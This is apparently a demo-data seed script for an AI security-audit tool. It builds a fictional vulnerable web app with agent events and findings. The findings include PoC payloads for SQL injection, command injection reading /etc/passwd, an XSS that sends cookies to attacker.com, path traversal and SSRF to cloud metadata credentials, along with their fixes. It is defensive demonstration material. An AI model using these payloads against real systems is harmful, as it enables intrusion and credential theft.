#!/usr/bin/env python3
"""
创建 Agent 审计任务演示数据
用于生成 HTML 报告示例展示

运行方式:
cd backend && python -m scripts.create_agent_demo_data
"""

import asyncio
import json
import uuid
import sys
import os
from datetime import datetime, timedelta, timezone

# 添加backend目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker
from sqlalchemy.future import select

from app.core.config import settings
from app.models.user import User
from app.models.project import Project
from app.models.agent_task import (
    AgentTask, AgentEvent, AgentFinding, AgentTreeNode, AgentCheckpoint,
    AgentTaskStatus, AgentTaskPhase, AgentEventType,
    VulnerabilitySeverity, VulnerabilityType, FindingStatus
)


# 演示数据配置
DEMO_PROJECT_NAME = "VulnWebApp - 安全演示项目"
DEMO_TASK_NAME = "智能漏洞挖掘审计 - 完整示例"


async def get_or_create_demo_project(db: AsyncSession, user_id: str) -> Project:
    """获取或创建演示项目"""
    result = await db.execute(
        select(Project).where(Project.name == DEMO_PROJECT_NAME)
    )
    project = result.scalars().first()

    if not project:
        project = Project(
            name=DEMO_PROJECT_NAME,
            description="用于演示 Agent 智能审计功能的示例 Web 应用项目，包含多种常见安全漏洞",
            source_type="zip",
            owner_id=user_id,
            is_active=True,
            default_branch="main",
            programming_languages=json.dumps(["Python", "JavaScript", "SQL"]),
            created_at=datetime.now(timezone.utc) - timedelta(days=7),
        )
        db.add(project)
        await db.flush()
        print(f"✓ 创建演示项目: {project.name}")
    else:
        print(f"演示项目已存在: {project.name}")

    return project


async def create_agent_demo_task(db: AsyncSession, project: Project, user_id: str) -> AgentTask:
    """创建 Agent 审计任务演示数据"""

    # 检查是否已存在
    result = await db.execute(
        select(AgentTask).where(AgentTask.name == DEMO_TASK_NAME)
    )
    existing = result.scalars().first()
    if existing:
        print(f"删除已存在的演示任务: {existing.id}")
        await db.delete(existing)
        await db.flush()

    now = datetime.now(timezone.utc)
    task_start = now - timedelta(minutes=15)
    task_end = now - timedelta(minutes=2)

    # 创建 Agent 任务
    task = AgentTask(
        id=str(uuid.uuid4()),
        project_id=project.id,
        created_by=user_id,
        name=DEMO_TASK_NAME,
        description="对 VulnWebApp 进行全面的安全漏洞扫描，包括 SQL 注入、XSS、命令注入等常见漏洞类型的检测与验证",
        task_type="agent_audit",

        # 配置
        audit_scope={"include": ["**/*.py", "**/*.js", "**/*.html"], "exclude": ["tests/*", "node_modules/*"]},
        target_vulnerabilities=["sql_injection", "xss", "command_injection", "path_traversal", "ssrf", "hardcoded_secret"],
        verification_level="sandbox",
        branch_name="main",
        exclude_patterns=["*.test.py", "*.spec.js", "__pycache__/*"],

        # LLM 配置
        llm_config={"provider": "openai", "model": "gpt-4", "temperature": 0.1},
        agent_config={"max_depth": 3, "enable_verification": True, "enable_poc_generation": True},
        max_iterations=50,
        token_budget=100000,
        timeout_seconds=1800,

        # 状态
        status=AgentTaskStatus.COMPLETED,
        current_phase=AgentTaskPhase.REPORTING,
        current_step="报告生成完成",

        # 进度统计
        total_files=48,
        indexed_files=48,
        analyzed_files=48,
        total_chunks=156,

        # Agent 统计
        total_iterations=32,
        tool_calls_count=87,
        tokens_used=45680,

        # 发现统计
        findings_count=8,
        verified_count=6,
        false_positive_count=1,

        # 严重程度统计
        critical_count=2,
        high_count=3,
        medium_count=2,
        low_count=1,

        # 评分
        quality_score=72.5,
        security_score=35.8,

        # 审计计划
        audit_plan={
            "phases": [
                {"name": "代码索引", "description": "建立代码向量索引，支持语义检索"},
                {"name": "入口点识别", "description": "识别用户输入入口点和敏感API"},
                {"name": "漏洞模式匹配", "description": "基于已知漏洞模式进行检测"},
                {"name": "数据流分析", "description": "追踪污点数据流，验证漏洞可达性"},
                {"name": "沙箱验证", "description": "在隔离环境中验证漏洞可利用性"},
                {"name": "PoC 编写 Agent", "description": "独立子 Agent，与验证者协作生成并优化漏洞 PoC"},
            ],
            "focus_areas": ["用户认证模块", "数据库查询接口", "文件上传功能", "API 端点"],
        },

        # 时间戳
        created_at=task_start - timedelta(minutes=1),
        started_at=task_start,
        completed_at=task_end,
    )

    db.add(task)
    await db.flush()
    print(f"✓ 创建 Agent 任务: {task.id}")

    return task


async def create_agent_events(db: AsyncSession, task: AgentTask) -> list:
    """创建 Agent 事件流"""

    events = []
    base_time = task.started_at
    sequence = 0

    def add_event(event_type: str, message: str, phase: str = None,
                  tool_name: str = None, tool_input: dict = None,
                  tool_output: dict = None, tool_duration_ms: int = None,
                  finding_id: str = None, tokens_used: int = 0,
                  metadata: dict = None, time_offset_seconds: int = 0):
        nonlocal sequence
        sequence += 1
        event = AgentEvent(
            id=str(uuid.uuid4()),
            task_id=task.id,
            event_type=event_type,
            phase=phase,
            message=message,
            tool_name=tool_name,
            tool_input=tool_input,
            tool_output=tool_output,
            tool_duration_ms=tool_duration_ms,
            finding_id=finding_id,
            tokens_used=tokens_used,
            event_metadata=metadata,
            sequence=sequence,
            created_at=base_time + timedelta(seconds=time_offset_seconds),
        )
        events.append(event)
        return event

    # ========== 任务启动 ==========
    add_event(
        AgentEventType.TASK_START,
        "Agent 审计任务启动，开始智能漏洞挖掘",
        metadata={"target_vulnerabilities": task.target_vulnerabilities},
        time_offset_seconds=0
    )

    # ========== 规划阶段 ==========
    add_event(
        AgentEventType.PHASE_START,
        "进入规划阶段 - 分析项目结构，制定审计策略",
        phase=AgentTaskPhase.PLANNING,
        time_offset_seconds=5
    )

    add_event(
        AgentEventType.THINKING,
        "分析项目结构：检测到 Flask Web 应用框架，包含用户认证、数据库操作、文件处理等模块。重点关注 SQL 注入、XSS、命令注入等高危漏洞。",
        phase=AgentTaskPhase.PLANNING,
        tokens_used=450,
        time_offset_seconds=10
    )

    add_event(
        AgentEventType.PLANNING,
        "制定审计计划：1) 索引代码库 2) 识别入口点 3) 模式匹配检测 4) 数据流分析 5) 沙箱验证 6) 生成报告",
        phase=AgentTaskPhase.PLANNING,
        tokens_used=380,
        time_offset_seconds=15
    )

    add_event(
        AgentEventType.PHASE_COMPLETE,
        "规划阶段完成，识别出 12 个高优先级检查点",
        phase=AgentTaskPhase.PLANNING,
        time_offset_seconds=20
    )

    # ========== 索引阶段 ==========
    add_event(
        AgentEventType.PHASE_START,
        "进入索引阶段 - 构建代码向量索引",
        phase=AgentTaskPhase.INDEXING,
        time_offset_seconds=25
    )

    add_event(
        AgentEventType.TOOL_CALL,
        "调用 RAG 索引工具，处理源代码文件",
        phase=AgentTaskPhase.INDEXING,
        tool_name="rag_index",
        tool_input={"paths": ["app/", "routes/", "models/", "utils/"], "chunk_size": 1500},
        time_offset_seconds=30
    )

    add_event(
        AgentEventType.RAG_RESULT,
        "代码索引完成：48 个文件，156 个代码块，向量维度 1536",
        phase=AgentTaskPhase.INDEXING,
        tool_name="rag_index",
        tool_output={"files_indexed": 48, "chunks_created": 156, "vector_dim": 1536},
        tool_duration_ms=8500,
        time_offset_seconds=45
    )

    add_event(
        AgentEventType.PHASE_COMPLETE,
        "索引阶段完成",
        phase=AgentTaskPhase.INDEXING,
        time_offset_seconds=50
    )

    # ========== 分析阶段 ==========
    add_event(
        AgentEventType.PHASE_START,
        "进入分析阶段 - 执行漏洞检测",
        phase=AgentTaskPhase.ANALYSIS,
        time_offset_seconds=55
    )

    # SQL 注入检测
    add_event(
        AgentEventType.THINKING,
        "开始检测 SQL 注入漏洞：搜索数据库查询相关代码，识别用户输入拼接到 SQL 语句的模式",
        phase=AgentTaskPhase.ANALYSIS,
        tokens_used=320,
        time_offset_seconds=60
    )

    add_event(
        AgentEventType.RAG_QUERY,
        "语义检索：查找 SQL 查询和用户输入处理代码",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="rag_search",
        tool_input={"query": "SQL query user input parameter database execute", "top_k": 10},
        time_offset_seconds=65
    )

    add_event(
        AgentEventType.TOOL_CALL,
        "读取文件: app/routes/user.py",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="read_file",
        tool_input={"path": "app/routes/user.py", "start_line": 45, "end_line": 80},
        time_offset_seconds=70
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现 SQL 注入漏洞 [Critical]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "sql_injection", "severity": "critical", "file": "app/routes/user.py", "line": 52},
        time_offset_seconds=80
    )

    # XSS 检测
    add_event(
        AgentEventType.THINKING,
        "开始检测 XSS 漏洞：搜索 HTML 渲染和用户输入输出相关代码",
        phase=AgentTaskPhase.ANALYSIS,
        tokens_used=280,
        time_offset_seconds=120
    )

    add_event(
        AgentEventType.TOOL_CALL,
        "读取文件: app/templates/comment.html",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="read_file",
        tool_input={"path": "app/templates/comment.html"},
        time_offset_seconds=130
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现存储型 XSS 漏洞 [High]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "xss", "severity": "high", "file": "app/templates/comment.html", "line": 28},
        time_offset_seconds=145
    )

    # 命令注入检测
    add_event(
        AgentEventType.RAG_QUERY,
        "语义检索：查找系统命令执行相关代码",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="rag_search",
        tool_input={"query": "os.system subprocess shell command execute", "top_k": 10},
        time_offset_seconds=180
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现命令注入漏洞 [Critical]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "command_injection", "severity": "critical", "file": "app/utils/backup.py", "line": 34},
        time_offset_seconds=210
    )

    # 路径遍历检测
    add_event(
        AgentEventType.TOOL_CALL,
        "分析文件操作代码",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="analyze_code",
        tool_input={"pattern": "file path user input", "scope": "app/routes/"},
        time_offset_seconds=250
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现路径遍历漏洞 [High]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "path_traversal", "severity": "high", "file": "app/routes/download.py", "line": 18},
        time_offset_seconds=280
    )

    # SSRF 检测
    add_event(
        AgentEventType.FINDING_NEW,
        "发现 SSRF 漏洞 [High]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "ssrf", "severity": "high", "file": "app/routes/proxy.py", "line": 42},
        time_offset_seconds=320
    )

    # 硬编码密钥检测
    add_event(
        AgentEventType.TOOL_CALL,
        "扫描硬编码密钥和敏感信息",
        phase=AgentTaskPhase.ANALYSIS,
        tool_name="secret_scan",
        tool_input={"patterns": ["api_key", "password", "secret", "token"]},
        time_offset_seconds=360
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现硬编码 API 密钥 [Medium]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "hardcoded_secret", "severity": "medium", "file": "app/config.py", "line": 15},
        time_offset_seconds=380
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现弱加密配置 [Medium]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "weak_crypto", "severity": "medium", "file": "app/utils/crypto.py", "line": 8},
        time_offset_seconds=400
    )

    add_event(
        AgentEventType.FINDING_NEW,
        "发现调试模式未关闭 [Low]",
        phase=AgentTaskPhase.ANALYSIS,
        metadata={"vulnerability_type": "security_misconfiguration", "severity": "low", "file": "app/__init__.py", "line": 25},
        time_offset_seconds=420
    )

    add_event(
        AgentEventType.PHASE_COMPLETE,
        "分析阶段完成，发现 8 个潜在漏洞",
        phase=AgentTaskPhase.ANALYSIS,
        time_offset_seconds=450
    )

    # ========== 验证阶段 ==========
    add_event(
        AgentEventType.PHASE_START,
        "进入验证阶段 - 在沙箱环境中验证漏洞",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=460
    )

    # SQL 注入验证
    add_event(
        AgentEventType.SANDBOX_START,
        "启动沙箱环境验证 SQL 注入漏洞",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        time_offset_seconds=470
    )

    add_event(
        AgentEventType.SANDBOX_EXEC,
        "执行 SQL 注入 PoC：' OR '1'='1' --",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_input={"payload": "' OR '1'='1' --", "target": "/api/user/search?name="},
        time_offset_seconds=480
    )

    add_event(
        AgentEventType.SANDBOX_RESULT,
        "SQL 注入验证成功 - 成功绕过认证获取所有用户数据",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_output={"success": True, "response_code": 200, "data_leaked": True},
        tool_duration_ms=1200,
        time_offset_seconds=490
    )

    add_event(
        AgentEventType.FINDING_VERIFIED,
        "SQL 注入漏洞已验证 [Critical]",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=495
    )

    # 命令注入验证
    add_event(
        AgentEventType.SANDBOX_EXEC,
        "执行命令注入 PoC：; id; whoami",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_input={"payload": "; id; whoami", "target": "/api/backup?filename="},
        time_offset_seconds=520
    )

    add_event(
        AgentEventType.SANDBOX_RESULT,
        "命令注入验证成功 - 成功执行任意系统命令",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_output={"success": True, "output": "uid=1000(www-data) gid=1000(www-data)"},
        tool_duration_ms=800,
        time_offset_seconds=535
    )

    add_event(
        AgentEventType.FINDING_VERIFIED,
        "命令注入漏洞已验证 [Critical]",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=540
    )

    # XSS 验证
    add_event(
        AgentEventType.SANDBOX_EXEC,
        "执行 XSS PoC：<script>alert('XSS')</script>",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_input={"payload": "<script>alert('XSS')</script>", "target": "/api/comment"},
        time_offset_seconds=560
    )

    add_event(
        AgentEventType.FINDING_VERIFIED,
        "存储型 XSS 漏洞已验证 [High]",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=580
    )

    # 路径遍历验证
    add_event(
        AgentEventType.SANDBOX_EXEC,
        "执行路径遍历 PoC：../../../etc/passwd",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_input={"payload": "../../../etc/passwd", "target": "/api/download?file="},
        time_offset_seconds=600
    )

    add_event(
        AgentEventType.FINDING_VERIFIED,
        "路径遍历漏洞已验证 [High]",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=620
    )

    # SSRF 验证
    add_event(
        AgentEventType.SANDBOX_EXEC,
        "执行 SSRF PoC：http://169.254.169.254/latest/meta-data/",
        phase=AgentTaskPhase.VERIFICATION,
        tool_name="sandbox",
        tool_input={"payload": "http://169.254.169.254/latest/meta-data/", "target": "/api/proxy?url="},
        time_offset_seconds=640
    )

    add_event(
        AgentEventType.FINDING_VERIFIED,
        "SSRF 漏洞已验证 [High]",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=660
    )

    # 误报排除
    add_event(
        AgentEventType.THINKING,
        "验证硬编码密钥：检查是否为测试/示例配置",
        phase=AgentTaskPhase.VERIFICATION,
        tokens_used=180,
        time_offset_seconds=680
    )

    add_event(
        AgentEventType.FINDING_FALSE_POSITIVE,
        "硬编码密钥为误报 - 该文件为示例配置模板",
        phase=AgentTaskPhase.VERIFICATION,
        metadata={"reason": "File is example configuration template, not production code"},
        time_offset_seconds=700
    )

    add_event(
        AgentEventType.PHASE_COMPLETE,
        "验证阶段完成：6 个漏洞已验证，1 个误报已排除",
        phase=AgentTaskPhase.VERIFICATION,
        time_offset_seconds=720
    )

    # ========== 报告阶段 ==========
    add_event(
        AgentEventType.PHASE_START,
        "进入报告阶段 - 生成安全审计报告",
        phase=AgentTaskPhase.REPORTING,
        time_offset_seconds=730
    )

    add_event(
        AgentEventType.TOOL_CALL,
        "生成漏洞详情和修复建议",
        phase=AgentTaskPhase.REPORTING,
        tool_name="generate_report",
        tool_input={"format": "html", "include_poc": True, "include_fix": True},
        time_offset_seconds=740
    )

    add_event(
        AgentEventType.INFO,
        "报告生成完成：包含 8 个发现、6 个已验证漏洞、详细修复建议和 PoC 代码",
        phase=AgentTaskPhase.REPORTING,
        time_offset_seconds=760
    )

    add_event(
        AgentEventType.PHASE_COMPLETE,
        "报告阶段完成",
        phase=AgentTaskPhase.REPORTING,
        time_offset_seconds=770
    )

    # ========== 任务完成 ==========
    add_event(
        AgentEventType.TASK_COMPLETE,
        "Agent 审计任务完成！发现 8 个安全问题，其中 2 个严重、3 个高危、2 个中危、1 个低危",
        metadata={
            "total_findings": 8,
            "verified": 6,
            "false_positives": 1,
            "severity_distribution": {"critical": 2, "high": 3, "medium": 2, "low": 1},
            "duration_seconds": 780,
            "tokens_used": 45680,
        },
        time_offset_seconds=780
    )

    # 批量保存事件
    for event in events:
        db.add(event)

    await db.flush()
    print(f"✓ 创建了 {len(events)} 个 Agent 事件")

    return events


async def create_agent_findings(db: AsyncSession, task: AgentTask) -> list:
    """创建 Agent 发现的漏洞"""

    findings_data = [
        {
            "vulnerability_type": VulnerabilityType.SQL_INJECTION,
            "severity": VulnerabilitySeverity.CRITICAL,
            "title": "用户搜索接口存在 SQL 注入漏洞",
            "description": "在 /api/user/search 接口中，用户输入的 name 参数直接拼接到 SQL 查询语句中，未经过任何过滤或参数化处理，攻击者可以通过构造恶意输入执行任意 SQL 语句。",
            "file_path": "app/routes/user.py",
            "line_start": 52,
            "line_end": 58,
            "function_name": "search_user",
            "code_snippet": '''@app.route('/api/user/search')
def search_user():
    name = request.args.get('name', '')
    # 危险：直接拼接用户输入到SQL语句
    query = f"SELECT * FROM users WHERE name LIKE '%{name}%'"
    result = db.execute(query)
    return jsonify(result.fetchall())''',
            "source": "request.args.get('name')",
            "sink": "db.execute(query)",
            "dataflow_path": [
                {"step": 1, "location": "line 54", "description": "用户输入从 request.args.get() 获取"},
                {"step": 2, "location": "line 56", "description": "用户输入直接拼接到 SQL 字符串"},
                {"step": 3, "location": "line 57", "description": "拼接后的 SQL 被执行"},
            ],
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "沙箱验证 - 成功执行 SQL 注入攻击",
            "verification_result": {"success": True, "payload": "' OR '1'='1' --", "impact": "绕过认证，获取所有用户数据"},
            "has_poc": True,
            "poc_code": '''import requests

# SQL 注入 PoC
target_url = "http://target.com/api/user/search"

# Payload: 绕过认证获取所有用户
payload = "' OR '1'='1' --"

response = requests.get(target_url, params={"name": payload})
print(f"Status: {response.status_code}")
print(f"Data: {response.json()}")

# 预期结果：返回所有用户数据，而非仅匹配搜索条件的用户''',
            "poc_description": "通过在 name 参数中注入 SQL 语句，绕过查询条件获取数据库中所有用户信息",
            "poc_steps": [
                "访问目标 URL: /api/user/search?name=' OR '1'='1' --",
                "观察响应：应返回所有用户数据",
                "进一步利用：可尝试 UNION 注入获取其他表数据",
            ],
            "suggestion": "使用参数化查询或 ORM 框架来防止 SQL 注入",
            "fix_code": '''@app.route('/api/user/search')
def search_user():
    name = request.args.get('name', '')
    # 修复：使用参数化查询
    query = "SELECT * FROM users WHERE name LIKE :name"
    result = db.execute(query, {"name": f"%{name}%"})
    return jsonify(result.fetchall())''',
            "fix_description": "使用 SQLAlchemy 的参数化查询功能，将用户输入作为参数传递，而非直接拼接到 SQL 语句中",
            "references": [
                {"type": "CWE", "id": "CWE-89", "url": "https://cwe.mitre.org/data/definitions/89.html"},
                {"type": "OWASP", "id": "A03:2021", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
            ],
            "ai_explanation": "这是一个典型的 SQL 注入漏洞。代码直接将用户输入拼接到 SQL 查询字符串中，没有进行任何转义或参数化处理。攻击者可以通过特殊字符（如单引号）闭合原有的 SQL 语句，然后注入自己的 SQL 代码。",
            "ai_confidence": 0.98,
            "xai_what": "SQL 注入是一种代码注入技术，攻击者通过在输入字段中插入恶意 SQL 代码来操纵数据库查询。",
            "xai_why": "该漏洞存在是因为开发者直接将用户输入拼接到 SQL 语句中，没有使用参数化查询或进行输入验证。",
            "xai_how": "攻击者可以在 name 参数中输入 ' OR '1'='1' -- 来绕过查询条件，或使用 UNION SELECT 来获取其他表的数据。",
            "xai_impact": "攻击者可以：1) 绕过认证 2) 读取敏感数据 3) 修改或删除数据 4) 在某些情况下执行系统命令。",
            "cvss_score": 9.8,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "tags": ["owasp-top10", "injection", "database", "authentication-bypass"],
        },
        {
            "vulnerability_type": VulnerabilityType.COMMAND_INJECTION,
            "severity": VulnerabilitySeverity.CRITICAL,
            "title": "备份功能存在命令注入漏洞",
            "description": "在备份功能中，用户提供的文件名参数直接传递给 os.system() 函数执行，攻击者可以通过命令分隔符（如 ; 或 |）注入任意系统命令。",
            "file_path": "app/utils/backup.py",
            "line_start": 34,
            "line_end": 40,
            "function_name": "create_backup",
            "code_snippet": '''def create_backup(filename):
    """创建备份文件"""
    # 危险：直接将用户输入传递给系统命令
    backup_path = f"/backups/{filename}.tar.gz"
    cmd = f"tar -czf {backup_path} /data/"
    os.system(cmd)  # 命令注入风险
    return backup_path''',
            "source": "filename 参数",
            "sink": "os.system(cmd)",
            "dataflow_path": [
                {"step": 1, "location": "line 34", "description": "filename 参数从外部传入"},
                {"step": 2, "location": "line 36", "description": "filename 拼接到 shell 命令"},
                {"step": 3, "location": "line 37", "description": "命令通过 os.system() 执行"},
            ],
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "沙箱验证 - 成功执行任意命令",
            "verification_result": {"success": True, "payload": "; id; whoami", "output": "uid=1000(www-data)"},
            "has_poc": True,
            "poc_code": '''import requests

# 命令注入 PoC
target_url = "http://target.com/api/backup"

# Payload: 注入系统命令
payload = "test; id; cat /etc/passwd"

response = requests.post(target_url, json={"filename": payload})
print(f"Response: {response.text}")

# 预期结果：服务器执行 id 和 cat /etc/passwd 命令''',
            "poc_description": "通过在 filename 参数中注入分号和系统命令，在服务器上执行任意代码",
            "poc_steps": [
                "构造恶意 filename: test; id; cat /etc/passwd",
                "发送请求到 /api/backup 接口",
                "观察服务器响应或日志中的命令执行结果",
            ],
            "suggestion": "避免使用 os.system()，改用 subprocess 模块并禁用 shell=True，对用户输入进行严格的白名单验证",
            "fix_code": '''import subprocess
import re

def create_backup(filename):
    """创建备份文件 - 安全版本"""
    # 修复：验证文件名只包含安全字符
    if not re.match(r'^[a-zA-Z0-9_-]+$', filename):
        raise ValueError("Invalid filename")

    backup_path = f"/backups/{filename}.tar.gz"
    # 修复：使用 subprocess 并传递参数列表
    subprocess.run(
        ["tar", "-czf", backup_path, "/data/"],
        check=True,
        shell=False  # 禁用shell
    )
    return backup_path''',
            "fix_description": "1) 使用正则表达式验证文件名只包含安全字符 2) 使用 subprocess.run() 替代 os.system() 3) 禁用 shell 模式，将参数作为列表传递",
            "references": [
                {"type": "CWE", "id": "CWE-78", "url": "https://cwe.mitre.org/data/definitions/78.html"},
                {"type": "OWASP", "id": "A03:2021", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
            ],
            "ai_explanation": "这是一个严重的命令注入漏洞。os.system() 函数会通过 shell 执行命令，当用户输入被直接拼接到命令字符串中时，攻击者可以使用 shell 的特殊字符（如 ;、|、&&）来注入额外的命令。",
            "ai_confidence": 0.99,
            "xai_what": "命令注入允许攻击者在目标系统上执行任意操作系统命令。",
            "xai_why": "该漏洞存在是因为用户输入直接拼接到 shell 命令中，没有进行任何过滤或转义。",
            "xai_how": "攻击者可以在 filename 参数中输入 ; rm -rf / 来删除服务器文件，或执行反弹 shell 获取服务器控制权。",
            "xai_impact": "完全的服务器控制权，包括：读取敏感文件、安装后门、横向移动、数据窃取、服务中断等。",
            "cvss_score": 10.0,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "tags": ["owasp-top10", "injection", "rce", "critical"],
        },
        {
            "vulnerability_type": VulnerabilityType.XSS,
            "severity": VulnerabilitySeverity.HIGH,
            "title": "评论功能存在存储型 XSS 漏洞",
            "description": "用户提交的评论内容在展示时未经 HTML 转义直接渲染，攻击者可以在评论中注入恶意 JavaScript 代码，当其他用户查看评论时会执行这些代码。",
            "file_path": "app/templates/comment.html",
            "line_start": 28,
            "line_end": 32,
            "function_name": None,
            "code_snippet": '''<div class="comment-list">
    {% for comment in comments %}
    <div class="comment-item">
        <p class="comment-content">{{ comment.content | safe }}</p>
        <!-- 危险：使用 safe 过滤器禁用了自动转义 -->
    </div>
    {% endfor %}
</div>''',
            "source": "comment.content (用户提交的评论)",
            "sink": "{{ comment.content | safe }}",
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "沙箱验证 - XSS payload 成功执行",
            "verification_result": {"success": True, "payload": "<script>alert('XSS')</script>"},
            "has_poc": True,
            "poc_code": """import requests

# 存储型 XSS PoC
target_url = "http://target.com/api/comment"

# Payload: 窃取用户 Cookie
payload = '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>'

response = requests.post(target_url, json={"content": payload})
print(f"Comment posted: {response.status_code}")

# 当其他用户访问评论页面时，恶意脚本会自动执行""",
            "poc_description": "通过在评论中注入 JavaScript 代码，当其他用户查看页面时窃取其 Cookie",
            "suggestion": "移除 safe 过滤器，让 Jinja2 自动转义 HTML 特殊字符",
            "fix_code": '''<div class="comment-list">
    {% for comment in comments %}
    <div class="comment-item">
        <!-- 修复：移除 safe 过滤器，使用自动转义 -->
        <p class="comment-content">{{ comment.content }}</p>
    </div>
    {% endfor %}
</div>''',
            "fix_description": "移除 | safe 过滤器，让 Jinja2 模板引擎自动对用户内容进行 HTML 转义",
            "references": [
                {"type": "CWE", "id": "CWE-79", "url": "https://cwe.mitre.org/data/definitions/79.html"},
                {"type": "OWASP", "id": "A03:2021", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
            ],
            "ai_confidence": 0.96,
            "xai_what": "存储型 XSS 是指恶意脚本被永久存储在目标服务器上，当用户访问包含该脚本的页面时会自动执行。",
            "xai_why": "该漏洞存在是因为模板使用了 safe 过滤器，禁用了 Jinja2 的自动 HTML 转义功能。",
            "xai_how": "攻击者提交包含 <script> 标签的评论，当其他用户浏览评论时，恶意脚本会在其浏览器中执行。",
            "xai_impact": "会话劫持、钓鱼攻击、恶意重定向、键盘记录、加密货币挖矿等。",
            "cvss_score": 8.1,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "tags": ["owasp-top10", "xss", "stored-xss", "frontend"],
        },
        {
            "vulnerability_type": VulnerabilityType.PATH_TRAVERSAL,
            "severity": VulnerabilitySeverity.HIGH,
            "title": "文件下载接口存在路径遍历漏洞",
            "description": "文件下载接口直接使用用户提供的文件名参数构建文件路径，没有验证路径是否在允许的目录范围内，攻击者可以使用 ../ 序列访问任意文件。",
            "file_path": "app/routes/download.py",
            "line_start": 18,
            "line_end": 26,
            "function_name": "download_file",
            "code_snippet": '''@app.route('/api/download')
def download_file():
    filename = request.args.get('file')
    # 危险：直接拼接用户输入构建路径
    file_path = os.path.join('/uploads/', filename)

    if os.path.exists(file_path):
        return send_file(file_path)
    return "File not found", 404''',
            "source": "request.args.get('file')",
            "sink": "send_file(file_path)",
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "沙箱验证 - 成功读取 /etc/passwd",
            "verification_result": {"success": True, "payload": "../../../etc/passwd", "file_read": True},
            "has_poc": True,
            "poc_code": '''import requests

# 路径遍历 PoC
target_url = "http://target.com/api/download"

# Payload: 读取系统敏感文件
payload = "../../../etc/passwd"

response = requests.get(target_url, params={"file": payload})
print(f"File content:\\n{response.text}")''',
            "suggestion": "使用 os.path.realpath() 解析路径后验证是否在允许的目录内",
            "fix_code": '''import os
from pathlib import Path

UPLOAD_DIR = Path('/uploads/').resolve()

@app.route('/api/download')
def download_file():
    filename = request.args.get('file')

    # 修复：解析真实路径并验证
    file_path = (UPLOAD_DIR / filename).resolve()

    # 确保文件在允许的目录内
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        return "Access denied", 403

    if file_path.exists():
        return send_file(file_path)
    return "File not found", 404''',
            "references": [
                {"type": "CWE", "id": "CWE-22", "url": "https://cwe.mitre.org/data/definitions/22.html"},
            ],
            "ai_confidence": 0.95,
            "cvss_score": 7.5,
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "tags": ["path-traversal", "file-read", "lfi"],
        },
        {
            "vulnerability_type": VulnerabilityType.SSRF,
            "severity": VulnerabilitySeverity.HIGH,
            "title": "代理接口存在 SSRF 漏洞",
            "description": "代理接口接受用户提供的 URL 并发起请求，没有验证目标地址，攻击者可以利用此漏洞访问内网资源或云元数据服务。",
            "file_path": "app/routes/proxy.py",
            "line_start": 42,
            "line_end": 50,
            "function_name": "proxy_request",
            "code_snippet": '''@app.route('/api/proxy')
def proxy_request():
    target_url = request.args.get('url')
    # 危险：直接请求用户提供的 URL
    response = requests.get(target_url)
    return response.content''',
            "source": "request.args.get('url')",
            "sink": "requests.get(target_url)",
            "status": FindingStatus.VERIFIED,
            "is_verified": True,
            "verification_method": "沙箱验证 - 成功访问内网元数据服务",
            "verification_result": {"success": True, "payload": "http://169.254.169.254/latest/meta-data/"},
            "has_poc": True,
            "poc_code": '''import requests

# SSRF PoC - 访问 AWS 元数据
target_url = "http://target.com/api/proxy"
payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

response = requests.get(target_url, params={"url": payload})
print(f"AWS Credentials:\\n{response.text}")''',
            "suggestion": "实现 URL 白名单验证，禁止访问内网地址和元数据服务",
